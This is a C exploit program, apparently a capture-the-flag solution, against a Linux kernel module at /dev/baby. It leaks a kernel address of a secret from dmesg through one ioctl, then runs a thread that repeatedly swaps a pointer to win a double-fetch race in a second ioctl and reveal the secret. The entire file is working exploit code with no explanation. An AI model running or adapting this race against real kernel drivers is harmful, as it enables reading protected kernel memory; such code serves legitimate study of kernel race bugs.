#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>

struct flag_struct {
    char * flag;
    int size;
};


typedef unsigned long long uint64;

struct flag_struct flag;
char flag_buf[33];
uint64 flag_addr;

#define LEN 0x100
char buf[LEN+1] = {0};


int ret = 1;
void set_flag_buf(){
    while (ret){
        flag.flag = flag_addr;
    }
}



int main(){
    int fd = open("/dev/baby", O_RDONLY);
    if (fd < 0){
        printf("open /dev/baby error!\n");
        exit(-1);
    }

    memset(flag_buf, 'a', 33);
    ioctl(fd, 0x6666, &flag);
    system("dmesg | grep flag > /tmp/record.txt");

    int addr_fd = open("/tmp/record.txt", O_RDONLY);
    read(addr_fd, buf, LEN);
    close(addr_fd);

    char *idx = strstr(buf, "Your flag is at ");


    if (idx == 0){
        printf("%s\n", buf);
        printf("error not flag addr\n");
        exit(-1);
    } else {
        idx+= strlen("Your flag is at ");
        flag_addr = strtoull(idx, idx+16, 16);
    }
    printf("flag addr %llx", flag_addr);

    pthread_t tid; 
    pthread_create(&tid, NULL, set_flag_buf, NULL);

    while(ret){
        flag.flag = flag_buf;
        flag.size = 33;
        ret = ioctl(fd, 0x1337, &flag);
    }

    
    system("dmesg | grep -A 3 flag");


    return 0;
}
